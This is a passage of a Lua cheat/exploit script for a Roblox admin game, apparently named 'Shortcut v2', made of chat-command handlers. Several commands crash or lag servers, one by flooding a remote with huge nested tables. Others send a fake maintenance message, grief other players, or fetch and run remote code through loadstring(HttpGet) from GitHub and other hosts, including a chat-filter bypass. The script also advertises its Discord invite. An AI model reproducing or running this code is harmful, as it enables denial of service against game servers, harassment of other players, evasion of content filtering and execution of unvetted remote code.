            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
            say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
            cht("refresh all");wait()
            cht("/regpiss")
        end
        if msg:lower() == prefix .. "bmove" then
            print("Omg real working btools")
                    --//     Sussy Script     //--
            logn("bmove Lite loaded")
            if shared.__Dispose ~= nil then
                shared.__Dispose()
                shared.__Dispose = nil
            end
            local exit = false
            local connections = {}
            shared.__Dispose = function()
                for i, c in ipairs(connections) do
                    c:Disconnect()
                end
                exit = true
            end
        
        --//     Services     //--
            local plyrs = game:GetService("Players")
            local ws = game:GetService("Workspace")
            local rns = game:GetService("RunService")
        
        --//     Tables     //--
            local Nav = {
                target,
                held = false,
                ut
            }
        
        --//     Variables     //--
            local lp = plyrs.LocalPlayer
            local mouse = lp:GetMouse()
        
        --//     Functions     //--
            local ivorysc = game:HttpGet("https://raw.githubusercontent.com/T3chn0w1thth4t/scripts-cheats-2/main/Protected%20(99).lua")
            local IvoryMovePart = nil -- my fancy move library
            local function MovePart(t, p)
            --t.CFrame = p
                IvoryMovePart = loadstring(ivorysc, true)()
                IvoryMovePart(t, p, true)
                IvoryMovePart = nil
                workspace.Gravity = 191
            end
            local function FloorVec(v)
                return Vector3.new(math.floor(v.X), math.floor(v.Y), math.floor(v.Z))
            end
        
        --//     Code     //--
            table.insert(connections, mouse.Button1Down:Connect(function() -- get
                if mouse.Target then
                    Nav.ut = mouse.Target
                    Nav.target = Nav.ut:Clone()
                    Nav.target.Parent = ws
                    Nav.target.CanCollide = false
                    Nav.target.Transparency = 0.6
                    mouse.TargetFilter = Nav.target
                    Nav.held = true
                end
            end))
            table.insert(connections, rns.RenderStepped:Connect(function() -- client move
                if Nav.held and Nav.target then
                    local pos = ws.Camera.CFrame.Position + (mouse.UnitRay.Direction * 30)
                    Nav.target.Position = FloorVec(pos)
                end
            end))
            table.insert(connections, mouse.Button1Up:Connect(function() -- finish & mov
                Nav.target:Destroy()
                MovePart(Nav.ut, Nav.target.CFrame)
                mouse.TargetFilter = nil
                Nav.held = false
                Nav.target = nil
                Nav.ut = nil
            end))
            repeat
                wait()
            until exit
            return
        end

        if msg:lower() == prefix .. "fixgrav" then
            workspace.Gravity = 196.2
        end
        if msg:lower() == prefix .. "antigearon" then
            cht("/toggle anticrashvg on")
            antigear = true
            for i, v in pairs(game.Players:GetPlayers()) do
                if #v.Backpack:GetChildren() > 0 then
                    cht("/sm pending request...");
                    wait(.5)
                    cht("ungear "..csp.." others")
                end
            end
        end
        if msg:lower() == prefix .. "antigearoff" then
            cht("/toggle anticrashvg off")
            antigear = false
        end

        if msg:lower() == prefix .. "god" then
            cht("/toggle antikill")
            logn("Disable antikill before you use this")
            loadstring(game:HttpGet(("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/EFling%20SCV2%20press%20E.lua"),true))()
        end

        if msg:lower() == prefix .. "idrj" then -- Make players rejoin if you're whitelisted.
            cht(";prefix ;");wait(1)
            cht(prefix.."rj");wait(1)
            cht(";prefix /")
        end
        if msg:lower() == prefix .. "uncs" then -- Kick players if you're whitelisted.
            game.Players.LocalPlayer:kick("Unexpected Client Behavior")
            wait(5.5)
            game:shutdown()
        end
        if msg:lower() == prefix .. "unmovedb" then
            game:GetService("Workspace").FallenPartsDestroyHeight = -10001
            wait(.35)
            logn("Unmoved")
        end
        if string.sub(msg:lower(), 0, 8 + #prefix) == prefix.."mboombox" then
            local msggg = string.sub(msg:lower(), 10 + #prefix)
            local tlrs = game.Players.LocalPlayer.Backpack:GetDescendants()
            local plrs = game:GetService("Players")
            local chr = plrs.LocalPlayer.Character

            for i,v in pairs(tlrs) do
                coroutine.wrap(function()
                    if v:IsA'Tool' then
                        function rng() return math.random(-128, 128) end
                        v.GripPos = Vector3.new(rng(), 1, rng());wait(0.25)
                        v.Parent = chr
                        wait(0.25) -- wait for tool to equip
                        v.Remote:FireServer("PlaySong", tonumber(msggg)) -- play song
                    end
                end)()
            end
        end
        if msg:lower() == prefix .. "msgnoabuse" then
            cht(prefix.."setmsg abusing admin isn't tolerated in this server, doing so will result in a punishment.")
        end
        if msg:lower() == prefix .. "msgtruth" then
            cht(prefix.."setmsg lf the fi rst command after getting admin is an ''others'' command you've officially proven yourself fatherless")
            cht("m SPREAD THE WORD BUCKOS")
        end
        if msg:lower() == prefix .. "pin" then
            say("The invite link is: .gg/65yHbG4Wfa")
            cht(prefix.."tspam h \n \n \n Join VIA shortcut today for this script! \n \n \n ")
        end
        if msg:lower() == prefix .. "shutdown" then
            cht("/toggle anticrashvg");wait(.1)
            cht("h \n\n\nServer Message: The server has closed due to maintenance. Error Code 267 \n\n\n")
            cht("blind all")
            cht("/regpiss")
            cht(":gear me "..csp.."94794847")
            local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
            game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
            for _, v in ipairs(Backpack:GetChildren()) do
                v.Parent = game.Players.LocalPlayer.Character
                v:Activate()
            end

            wait(.35)
            for i = 1, 9 do
                cht("unsize me me me");task.wait()
            end
            wait(1.5)
            task.spawn(function()
                for i = 1, 99 do
                    game.Players:Chat("size all .3")
                    game.Players:Chat("size all .3")
                    game.Players:Chat("size all .3")
                    game.Players:Chat("freeze all")
                    game.Players:Chat("size all 10")
                    game.Players:Chat("size all 10")
                    game.Players:Chat("size all 10")
                    game.Players:Chat("clone all")
                    wait()
                end
            end)

            wait(.65)

            for i = 1, 2 do
                local table1 = {}
                local table2 = {}

                local function loop(v1, v2)
                    for i = v1, v2 do
                        table.insert(table1, table2)
                    end
                end

                local function crash(v1)
                    for i = 1, v1 do
                        table.insert(table2[1], {})
                    end

                    if 4999999 / (v1 + 2) then
                        loop(1, 4999999 / (v1 + 2))
                    else
                        loop(1, 4999999)
                    end
                    game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
                end

                table.insert(table2, {})
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                crash(250)
            end
        end
        if msg:lower() == prefix .. "tempcrash" then
            for i = 1, 3 do
                game.Players:Chat("size all .3")
                game.Players:Chat("size all .3")
                game.Players:Chat("size all .3")
                game.Players:Chat("freeze all")
                game.Players:Chat("size all 10")
                game.Players:Chat("size all 10")
                game.Players:Chat("size all 10")
                game.Players:Chat("clone all")
                wait()
            end
        end
        if msg:lower() == prefix .. "silcrash" then
            cht(prefix.."movedb")
            cht("size me .3")
            cht("size me .3")
            cht("size me .3")
            cht("gear me "..csp.."94794847")
            logn("Wait for about 15-20 seconds before leaving")
            for i = 1, 999 do
                game.Players:Chat("gear me "..csp.."94794847")
                game.Players:Chat("size others .3")
                game.Players:Chat("size others .3")
                game.Players:Chat("size others .3")
                game.Players:Chat("freeze others")
                game.Players:Chat("size others 10")
                game.Players:Chat("size others 10")
                game.Players:Chat("size others 10")
                game.Players:Chat("clone others")
                game.Players:Chat("/alltools")
                wait()
            end
        end

        if msg:lower() == prefix .. "bypass" then
            local h = Instance.new("Hint")
            h.Parent = Workspace
            h.Text = "Bypassing the fucking chat" ;wait(10)
            h:Remove()
            loadstring(game:HttpGet("https://the-shed.dev/scripts/sbp.lua", true))()
            logn("fuck yeah")
            cht(
                "pm me Alot of words ain't tagged if you type a . before then for example .hi .you .guys .f"
            )
        end
        if msg:lower() == prefix .. "correctbp" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-69, 4, 14));wait(.65)
            cht("/attach");wait(4.55)
            cht("unskydive me");wait(.35)
            cht("reset me")
        end
        if string.sub(msg:lower(), 0, 7) == prefix .. "fixbp" then
            workspace.Gravity = 0
            cht("/toggle antivoid")
            cht("invis Baseplate me")
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 2006, 90));wait(.25)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 4006, 90));wait(.25)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 6006, 90));wait(.25)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 8006, 90));wait(.25)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 10006, 90));wait(.25)
            cht("gear me "..csp.."108158379");wait()
            local function L_1_func()
                repeat wait()
                until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
            end
            local function L_2_func()
                repeat wait()
                until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                task.spawn(function()
                    while true do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                        L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                        if not L_14_ then
                            break
                        end
                    end
                end)
                task.spawn(function()
                    while L_14_ do
                        game:GetService('RunService').Heartbeat:Wait()
                        cht("unpunish me "..math.random(1,1000))
                    end
                end);wait(0.3)
                L_14_ = false
            end
            local L_3_ = math.random(1, 2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1));wait(.25)
            cht("gear me "..csp.."108158379")
            L_1_func();wait(.35)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            local L_4_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            cht("unfly me");wait(.2)
            repeat
                L_2_func()
        
            until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
        
            local L_5_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
            repeat wait()
            until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
        
            game.Players.LocalPlayer.Character:Destroy()
            cht("/toggle antivoid")
            L_1_func();wait(.35)
            local L_6_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
            for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                if L_16_forvar1.Name == "FakeCharacter" then
                    L_16_forvar1:Destroy()
                end
            end
            local L_7_ = game:GetService("Workspace").Terrain["_Game"]
            local L_8_ = L_7_.Workspace
            local L_9_ = L_7_.Admin
        end
        --game.Players.LocalPlayer.Character:Destroy()
        if string.sub(msg:lower(), 0, 9) == prefix .. "breakbp" then
            cht("gear me "..csp.."000108158379");wait()
            local function L_1_func()
                repeat wait()
                until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
            end
            local function L_2_func()
                repeat wait()
                until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
                task.spawn(function()
                    while true do
                        game:GetService('RunService').Heartbeat:Wait()
                        game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                        L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
                        if not L_14_ then
                            break
                        end
                    end
                end)
                task.spawn(function()
                    while L_14_ do
                        game:GetService('RunService').Heartbeat:Wait()
                        cht("unpunish me "..math.random(1,1000))
                    end
                end);wait(0.3)
                L_14_ = false
            end
            local L_3_ = math.random(1, 2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969));wait(.25)
            cht("setgrav me -550");wait()
            cht("gear me "..csp.."108158379")
            L_1_func();wait(.35)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            local L_4_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            cht("unfly me");wait(.2)
            repeat
                L_2_func()
        
            until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()
        
            local L_5_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
            repeat wait()
            until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")
        
            game.Players.LocalPlayer.Character:Destroy()
            cht("//breakcam");wait()
            cht("fogend -");wait()
            cht("flash");wait()
            cht("music "..csp.."1838663141");wait()
            L_1_func();wait(.35)
            local L_6_ = {
                [1] = Enum.KeyCode.E
            }
        
            game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
            repeat wait()
            until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
            for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                if L_16_forvar1.Name == "FakeCharacter" then
                    L_16_forvar1:Destroy()
                end
            end
            local L_7_ = game:GetService("Workspace").Terrain["_Game"]
            local L_8_ = L_7_.Workspace
            local L_9_ = L_7_.Admin
        end
        --game.Players.LocalPlayer.Character:Destroy()

        if msg:lower() == prefix .. "endapocalypse" then
            cht(":m Apocalypse has ended")
            cht("fix")
            cht("music")
            cht("clr")
        end
        if msg:lower() == prefix .. "ivory" then
            cht("gear me 000000000000000000000000108158379")
        end
        if msg:lower() == prefix .. "flood" then
            cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(10);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(5);cht("gear me 00000000000000000000000236438668");wait(2);cht("refresh me")
            logn("Stopped giving water crossbows")
        end
        if msg:lower() == prefix .. "periastron" then
            cht(":pm me Tools will be given shortly.")
            cht("gear me 000000000000000000159229806");wait(1.5)
            cht("gear me 000000000000000000233520257")
            cht("gear me 000000000000000000120307951");wait(2.5)
            cht("gear me 00000000000000000080661504")
            cht("gear me 00000000000000000093136802");wait(.35)
            cht("gear me 00000000000000000099119240")
            cht("gear me 00000000000000000073829193");wait(.65)
            cht("gear me 000000000000000000139577901")
            cht("gear me 0000000000000000002544549379");wait(3)
            cht(":pm me Tools have been given")
        end

        if msg:lower() == prefix .. "rej" then
            game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
        end
        if msg:lower() == prefix .. "rickroll" then
            cht(":music 6162284078")
            say("Imagine getting rickrolled lol")
            say("Anyways join Shortcut v2 today gg/65yHbG4Wfa !---")
            say("Shortcut v2 is the most powerful script ever!")
            cht("fogcolor 0 1000 0")
            cht("fogend nil")
            cht(":music 6162284078")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            cht("gear me 94794847")
            wait(1.75)
            cht("/alltools")
            wait(1.75)
            logn("Drop the gears with backspace or else the crash may only be temporarily")
            cht(prefix.."silcrash")
        end

        if msg:lower() == prefix .. "ivory" then
            cht("gear me 108158379")
        end
        if msg:lower() == prefix .. "rj" then
            game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
        end
                            --// GUI Commands \\--

        if msg:lower() == prefix .. "guiinput commands" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Commands"]
            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                v:Fire()
            end
            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                v:Fire()
            end
        end
        if msg:lower() == prefix .. "guiinput rainbowex" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["RainbowEx"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput clickexplode" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickExplode"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput clickpadban" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickPadban"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput clickannoy" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickAnnoy"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput hideregenpad" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["HideRegenPad"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput hideregenpad" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["HideRegenPad"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput deleteregenpad" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["DeleteRegenPad"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput rainbowpads" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["RainbowPads"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput deleteadminpads" then
            cht("//removepads")
        end
        if msg:lower() == prefix .. "guiinput noadmin lagger fe" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*NoAdmin Lagger FE"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput silent commands" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["Silent commands"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput builds" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Builds"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput f3x instead of btools" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["F3x instead of btools"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antigears" then
            antigear = true
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiGears"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
                cht("/toggle anticrashvg")
        end
        if msg:lower() == prefix .. "guiinput antilag" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiLag"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput antispeed" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiSpeed"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput perm" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Perm"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput guns" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["Guns"]
                for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                    v:Fire()
                end
                for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                    v:Fire()
                end
        end
        if msg:lower() == prefix .. "guiinput executor specs" then
            local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Executor Specs"]
